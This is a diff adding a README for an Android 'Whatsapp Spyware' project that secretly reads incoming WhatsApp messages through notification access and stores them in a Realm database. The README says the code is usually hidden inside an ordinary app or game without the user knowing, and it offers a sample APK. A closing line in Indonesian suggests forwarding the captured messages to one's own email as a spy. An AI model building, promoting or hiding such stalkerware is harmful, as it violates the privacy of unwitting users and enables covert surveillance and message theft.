@@ -1,0 +1,24 @@
+Name:
+Whatsapp Spyware
+
+Short description:
+Peek Whatsapp messages in secretly.
+
+Description:
+Apps that can peek Whatsapp incoming messages in secretly via push notifications. Usually this script included on an application or game, then staking messages in secret without known by the user.
+
+Features:
+Can be developed again.
+Can check Notification Access Setting.
+Using NotificationListener Service.
+Include sample Apk.
+
+
+Requirements:
+minSdkVersion 15
+compileSdkVersion 26
+buildToolsVersion "26.0.2"
+Realm-android 3.0.0
+
+
+Ini hanya contoh, pesan yang masuk disimpan dalam database realm. Andapun dapat bereksperimen misalnya pesan yang masuk di kirim ke email anda sebagai mata-mata.
